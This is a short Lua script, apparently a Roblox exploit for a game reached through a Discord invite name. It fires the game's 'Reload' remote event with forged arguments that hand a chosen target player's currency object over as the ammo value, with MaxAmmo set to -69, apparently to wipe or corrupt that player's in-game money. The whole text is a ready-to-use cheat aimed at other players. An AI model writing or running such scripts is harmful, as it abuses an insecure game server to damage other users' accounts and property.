--local player = "target name here" uncomment out this line if you arent running this from the loadstring

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
   "Reload",
   {
        Name = "[Revolver]",
        Ammo = game:GetService("Players")[player].DataFolder.Currency,
        MaxAmmo = {Value = -69}
   }
)
